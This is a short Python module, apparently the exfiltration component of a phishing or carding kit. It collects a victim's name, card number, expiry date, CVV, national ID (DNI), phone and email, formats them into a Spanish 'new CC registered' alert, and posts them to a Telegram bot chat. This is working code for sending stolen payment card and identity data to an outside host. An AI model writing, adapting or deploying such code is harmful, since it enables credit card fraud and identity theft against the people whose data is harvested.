import requests
from requests.exceptions import RequestException, HTTPError
from ..schemas.telegram import TelegramSchema
from ..config.settings import Settings



class Telegram:
    def __init__(self, payload):
        settings = Settings()
        self.chat_id = payload.get("chat_id", None)
        self.token = settings.telegram_token
                
        if not self.chat_id or not self.token:
            raise ValueError("Token or chat ID are missing!")
        
        self.dni = payload.get("DNI")
        self.number = payload.get("number")
        self.CVV = payload.get("CVV")
        self.Vto = payload.get("Vto")
        self.full_name = payload.get("full_name")
        self.phone = payload.get("phone")
        self.email = payload.get("email")
        
    def build_message(self):
        message = (
            f'Se ha registrado una nueva CC en su sistema.\n'
            f'NOMBRE: {self.full_name}\n'
            f'NRO TARJETA: {self.number}\n'
            f'CADUCIDAD: {self.Vto}\n'
            f'CVV: {self.CVV}\n'
            f'DNI: {self.dni}\n'
            f'TELEFONO: {self.phone}\n'
            f'EMAIL: {self.email}\n'
        )
        return message


    
    def send_message(self, message:str):
        url:str = f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text={message}"
        try:
            response = requests.get(url, timeout=20)
            response.raise_for_status()
            return {"message": response.json(), "status": 200}
        except HTTPError as e:
            return {"message": f"HTTP Error ocurred: {str(e)}", "status": 500}
        except TimeoutError as e:
            return {"message": f"Timeout error: {str(e)}", "status": 500}
        except ValueError as e:
            return {"message": f"Value error: {str(e)}", "status": 500}   
        except RequestException as e:
            return {"message": f"Unexpected exception: {str(e)}", "status": 500}
            
            
